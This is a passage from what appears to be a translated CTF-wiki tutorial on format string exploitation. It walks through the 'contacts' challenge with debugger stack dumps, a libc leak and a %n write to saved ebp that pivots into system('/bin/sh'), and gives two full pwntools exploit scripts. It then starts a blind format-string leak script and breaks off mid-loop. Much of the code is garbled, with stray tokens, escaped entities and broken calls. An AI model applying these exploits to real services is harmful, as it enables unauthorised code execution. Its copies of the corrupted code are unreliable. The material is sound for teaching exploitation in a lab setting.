0xffffcd4c│<span class="w"> </span>+<span class="w"> </span>0x50:<span class="w"> </span>0x080487a2<span class="w"> </span>→<span class="w"> </span>jmp<span class="w"> </span>0x80487b3
0xffffcd50│+0x54:<span class="w"> </span>0x0804b0a0<span class="w">  </span>→<span class="w">  </span>0x0804c420<span class="w">  </span>→<span class="w">  </span><span class="s2">&quot;1234567&quot;</span>

0xffffcd54│+0x58:<span class="w"> </span>0xffffcd68<span class="w">  </span>→<span class="w">  </span>0x00000004

0xffffcd58│+0x5c:<span class="w"> </span>0x00000050<span class="w"> </span><span class="o">(</span><span class="s2">&quot;P&quot;</span>?<span class="o">)</span>

0xffffcd5c│+0x60:<span class="w"> </span>0x00000000

0xffffcd60│+0x64:<span class="w"> </span>0xf7fad3dc<span class="w">  </span>→<span class="w">  </span>0xf7fae1e0<span class="w">  </span>→<span class="w">  </span>0x00000000

0xffffcd64│+0x68:<span class="w"> </span>0x08048288<span class="w">  </span>→<span class="w">  </span>0x00000082

0xffffcd68│+0x6c:<span class="w"> </span>0x00000004

0xffffcd6c│+0x70:<span class="w"> </span>0x0000000a

0xffffcd70│+0x74:<span class="w"> </span>0xf7fad000<span class="w">  </span>→<span class="w">  </span>0x001b1db0

0xffffcd74│+0x78:<span class="w"> </span>0xf7fad000<span class="w">  </span>→<span class="w">  </span>0x001b1db0

0xffffcd78│+0x7c:<span class="w"> </span>0x00000000

0xffffcd7c│+0x80:<span class="w"> </span>0xf7e13637<span class="w">  </span>→<span class="w">  </span>&lt;__libc_start_main+247&gt;<span class="w"> </span>add<span class="w"> </span>esp,<span class="w"> </span>0x10

0xffffcd80│+0x84:<span class="w"> </span>0x00000001

0xffffcd84│+0x88:<span class="w"> </span>0xffffce14<span class="w">  </span>→<span class="w">  </span>0xffffd00d<span class="w">  </span>→<span class="w">  </span><span class="s2">&quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]&quot;</span>

0xffffcd88│+0x8c:<span class="w"> </span>0xffffce1c<span class="w">  </span>→<span class="w">  </span>0xffffd058<span class="w">  </span>→<span class="w">  </span><span class="s2">&quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;</span>
</code></pre></div>
<p>We can get it by simple judgment.</p>
<div class="highlight"><pre><span></span><code>0xffffcd7c│+0x80: 0xf7e13637  →  &lt;__libc_start_main+247&gt; add esp, 0x10
</code></pre></div>
<p>Stored is the return address of __libc_start_main, and uses fmtarg to get the corresponding offset. It can be seen that the offset is 32, then the offset from the format string is 31.</p>
<div class="highlight"><pre><span></span><code>gef➤<span class="w">  </span>fmtarg<span class="w"> </span>0xffffcd7c

The<span class="w"> </span>index<span class="w"> </span>of<span class="w"> </span>format<span class="w"> </span>argument<span class="w"> </span>:<span class="w"> </span><span class="m">32</span>
</code></pre></div>
<p>This way we can get the corresponding address. In turn, you can get the corresponding libc according to libc-database, and then get the system function address and /bin/sh function address.</p>
<p>Second, we can determine that the address 0xffffcd2c of the formatted string stored on the stack is 11 relative to the format string, which is used to construct our contacts.</p>
<p>Furthermore, we can see that the following address holds the call address of the upper function, and its offset from the format string is 6, so that we can directly modify the value of ebp stored in the upper function.</p>
<div class="highlight"><pre><span></span><code>0xffffcd18│+0x1c:<span class="w"> </span>0xffffcd48<span class="w">  </span>→<span class="w">  </span>0xffffcd78<span class="w">  </span>→<span class="w">  </span>0x00000000<span class="w">   </span>←<span class="w"> </span><span class="nv">$ebp</span>
</code></pre></div>
<h4 id="constructing-a-contact-to-get-the-heap-address">Constructing a contact to get the heap address<a class="headerlink" href="#constructing-a-contact-to-get-the-heap-address" title="Permanent link">&para;</a></h4>
<p>After learning the above information, we can use the following method to get the heap address and the corresponding ebp address.</p>
<div class="highlight"><pre><span></span><code>[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]
</code></pre></div>
<p>To get the corresponding corresponding address. The latter bbbb is for the convenience of accepting strings.</p>
<p>Here, because the stack space requested by the function is the same as the free space, the ebp address we get will not change because we call it again.</p>
<p>In some environments, the system address will appear \x00, causing 0 truncation when printf will result in the inability to disclose both addresses, so you can modify the payload as follows:</p>
<div class="highlight"><pre><span></span><code>[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]
</code></pre></div>
<p>If the payload is modified to do this, you need to add a 12 offset to the heap. This ensures that the 0 truncation occurs after the leak.</p>
<h4 id="modify-ebp">Modify ebp<a class="headerlink" href="#modify-ebp" title="Permanent link">&para;</a></h4>
<p>Since we need to execute the move command to assign ebp to esp and also need to execute pop ebp to execute the ret instruction, we need to modify ebp to store the value of system address -4. After pop ebp, the esp happens to point to the address of the save system, and the system function can be executed by executing the ret instruction.</p>
<p>We have already learned the ebp value we want to modify, and we know that the corresponding offset is 6, so we can construct the following payload to modify the corresponding value.</p>
<div class="highlight"><pre><span></span><code>part1 = (heap_addr - 4) / 2

part2 = heap_addr - 4 - part1

payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
</code></pre></div>
<h4 id="get-the-shell">Get the shell<a class="headerlink" href="#get-the-shell" title="Permanent link">&para;</a></h4>
<p>At this time, after executing the format string function, exit to the upper function, we enter 5, exit the program will execute the ret instruction, you can get the shell.</p>
<h4 id="using-the-program_2">Using the program<a class="headerlink" href="#using-the-program_2" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">contact</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./contacts&#39;</span><span class="p">)</span>

<span class="c1">##context.log_level = &#39;debug&#39;</span>

<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">111</span><span class="p">)</span>

<span class="k">else</span><span class="p">:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./contacts&#39;</span><span class="p">)</span>





<span class="k">def</span><span class="w"> </span><span class="nf">createcontact</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">phone</span><span class="p">,</span> <span class="n">descrip_len</span><span class="p">,</span> <span class="n">description</span><span class="p">):</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Contact info: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Name: &#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;You have 10 numbers</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">phone</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Length of description: &#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">descrip_len</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;description:</span><span class="se">\n\t\t</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">description</span><span class="p">)</span>





<span class="k">def</span><span class="w"> </span><span class="nf">printcontact</span><span class="p">():</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Contacts:&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>





<span class="c1">## get system addr &amp; binsh_addr</span>

<span class="n">payload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="c1">#39;% 31 $ paaaa&amp;#39;</span>
<span class="n">createcontact</span><span class="p">(</span><span class="s1">&#39;1111&#39;</span><span class="p">,</span> <span class="s1">&#39;1111&#39;</span><span class="p">,</span> <span class="s1">&#39;111&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="nb">print</span> <span class="n">contact</span> <span class="p">()</span>
<span class="n">libc_start_main_ret</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;aaaa&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get libc_start_main_ret addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_start_main_ret</span><span class="p">))</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;__libc_start_main_ret&#39;</span><span class="p">,</span> <span class="n">libc_start_main_ret</span><span class="p">)</span>

<span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_start_main_ret</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;__libc_start_main_ret&#39;</span><span class="p">)</span>

<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>

<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get system addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get binsh addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>

<span class="c1">##gdb.attach(sh)</span>



<span class="c1">## get heap addr and ebp addr</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>

    <span class="n">system_addr</span><span class="p">,</span>

<span class="o">&amp;</span><span class="c1">#39;yyyah&amp;#39;,</span>
    <span class="n">binsh_addr</span><span class="p">,</span>

    <span class="s1">&#39;%6$p%11$pcccc&#39;</span><span class="p">,</span>

<span class="p">])</span>

<span class="n">createcontact</span><span class="p">(</span><span class="s1">&#39;2222&#39;</span><span class="p">,</span> <span class="s1">&#39;2222&#39;</span><span class="p">,</span> <span class="s1">&#39;222&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="nb">print</span> <span class="n">contact</span> <span class="p">()</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;cccc&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>

<span class="nb">print</span> <span class="n">data</span>

<span class="n">ebp_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>



<span class="c1">## modify ebp</span>

<span class="n">part1</span> <span class="o">=</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>

<span class="n">part2</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="n">part1</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part2</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%6$n&#39;</span>

<span class="c1">##print payload</span>

<span class="n">createcontact</span><span class="p">(</span><span class="s1">&#39;3333&#39;</span><span class="p">,</span> <span class="s1">&#39;123456789&#39;</span><span class="p">,</span> <span class="s1">&#39;300&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="nb">print</span> <span class="n">contact</span> <span class="p">()</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>

<span class="c1">##gdb.attach(sh)</span>

<span class="nb">print</span> <span class="s1">&#39;get shell&#39;</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)</span>
<span class="c1">##get shell</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p>In the case of system 0 truncation, exp is as follows:
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;debug&quot;</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s2">&quot;x86&quot;</span>



<span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./contacts&quot;</span><span class="p">)</span>

<span class="n">binary</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;contacts&quot;</span><span class="p">)</span>

<span class="n">libc</span><span class="o">=</span><span class="n">binary</span><span class="o">.</span><span class="n">libc</span>


<span class="k">def</span><span class="w"> </span><span class="nf">createcontact</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">phone</span><span class="p">,</span> <span class="n">descrip_len</span><span class="p">,</span> <span class="n">description</span><span class="p">):</span>

<span class="n">I</span> <span class="n">sh</span> <span class="o">=</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Contact info: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Name: &#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;You have 10 numbers</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">phone</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Length of description: &#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">descrip_len</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;description:</span><span class="se">\n\t\t</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">description</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">printcontact</span><span class="p">(</span><span class="n">io</span><span class="p">):</span>

<span class="n">I</span> <span class="n">sh</span> <span class="o">=</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Contacts:&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>



<span class="c1"># Gdb.attach (I)</span>


<span class="n">createcontact</span> <span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mi">111</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="o">%</span> <span class="mi">31</span> <span class="err">$</span> <span class="n">paaaa</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">printcontact</span> <span class="p">(</span><span class="n">I</span><span class="p">)</span>
<span class="n">libc_start_main</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;aaaa&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mi">241</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get libc_start_main addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_start_main</span><span class="p">))</span>

<span class="n">libc_base</span><span class="o">=</span><span class="n">libc_start_main</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;__libc_start_main&quot;</span><span class="p">]</span>

<span class="n">system</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>

<span class="n">binsh</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;system: &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;binsh: &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">binsh</span><span class="p">))</span>



<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%6$p%11$pccc&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;bbbb&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;dddd&quot;</span>

<span class="n">createcontact</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="s1">&#39;111&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">printcontact</span> <span class="p">(</span><span class="n">I</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;Description:&amp;#39;)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ccc&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>

<span class="nb">print</span> <span class="n">data</span>

<span class="n">ebp_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">12</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;ebp: &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;heap: &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>



<span class="n">part1</span> <span class="o">=</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>

<span class="n">part2</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="n">part1</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part2</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%6$n&#39;</span>



<span class="c1">#payload=fmtstr_payload(6,{ebp_addr:heap_addr})</span>

<span class="c1">##print payload</span>

<span class="n">createcontact</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s1">&#39;3333&#39;</span><span class="p">,</span> <span class="s1">&#39;123456789&#39;</span><span class="p">,</span> <span class="s1">&#39;300&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">printcontact</span> <span class="p">(</span><span class="n">I</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;Description:&amp;#39;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;Description:&amp;#39;)</span>
<span class="c1">##gdb.attach(sh)</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;get shell&quot;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)</span>
<span class="c1">##get shell</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span> <span class="o">&amp;</span><span class="c1">#39;5&amp;#39;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
</code></pre></div></p>
<p>It should be noted that this does not stabilize the shell because we have entered a string that is too long. But we have no way to control the address we want to enter in the front. It can only be this way.</p>
<p>Why do you need to print so much? Because the format string is not on the stack, even if we get the address of the ebp that needs to be changed, there is no way to write this address to the stack, use the $ symbol to locate him; because there is no way to locate, there is no way to use l \ll and other ways to write this address, so only print a lot.</p>
<h2 id="format-string-blind-hit">Format string blind hit<a class="headerlink" href="#format-string-blind-hit" title="Permanent link">&para;</a></h2>
<h3 id="principle_4">Principle<a class="headerlink" href="#principle_4" title="Permanent link">&para;</a></h3>
<p>The so-called format string blind typing means that only the interactive ip address and port are given. The corresponding binary file is not given to let us perform pwn. In fact, this is similar to BROP, but BROP uses stack overflow, and here We are using a format string vulnerability. In general, we follow the steps below</p>
<ul>
<li>Determine the number of bits in the program</li>
<li>Identify the location of the vulnerability
-Use</li>
</ul>
<p>Since I didn&#39;t find the source code after the game, I simply constructed two questions.</p>
<h3 id="example-1-leaking-stack">Example 1 - Leaking Stack<a class="headerlink" href="#example-1-leaking-stack" title="Permanent link">&para;</a></h3>
<p>Both the source and deployment files are placed in the corresponding folder [fmt_blind_stack] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack</a>).</p>
<h4 id="determine-the-number-of-programs">Determine the number of programs<a class="headerlink" href="#determine-the-number-of-programs" title="Permanent link">&para;</a></h4>
<p>We randomly entered %p and the program echoed the following information.</p>
<div class="highlight"><pre><span></span><code>➜<span class="w">  </span>blind_fmt_stack<span class="w"> </span>git:<span class="o">(</span>master<span class="o">)</span><span class="w"> </span>✗<span class="w"> </span>nc<span class="w"> </span>localhost<span class="w"> </span><span class="m">9999</span>

%p

0x7ffd4799beb0

G�flag<span class="w"> </span>is<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>stack%<span class="w">                          </span>
</code></pre></div>
<p>Tell us that the flag is on the stack and that the program is 64-bit and that there should be a format string vulnerability.</p>
<h4 id="use">Use<a class="headerlink" href="#use" title="Permanent link">&para;</a></h4>
<p>Then let&#39;s take a little test and see</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>





<span class="k">def</span><span class="w"> </span><span class="nf">leak</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">):</span>

        <span class="nb">print</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>





<span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>

